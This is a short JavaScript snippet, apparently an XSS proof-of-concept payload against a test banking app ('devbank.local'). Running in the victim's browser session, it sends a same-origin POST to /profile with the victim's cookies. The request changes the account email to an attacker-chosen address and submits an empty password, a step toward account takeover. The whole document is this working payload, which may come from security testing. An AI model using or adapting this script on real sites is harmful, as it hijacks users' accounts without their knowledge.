(async function () {
    const newEmail = "alice-xss-proof@devbank.local";

    const body = new URLSearchParams({
        email: newEmail,
        password: ""
    });

    try {
        const response = await fetch("/profile", {
            method: "POST",
            credentials: "same-origin",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: body.toString()
        });

        console.log("Profile update HTTP status:", response.status);
        console.log("Requested email:", newEmail);
    } catch (error) {
        console.error("Profile update failed:", error);
    }
})();
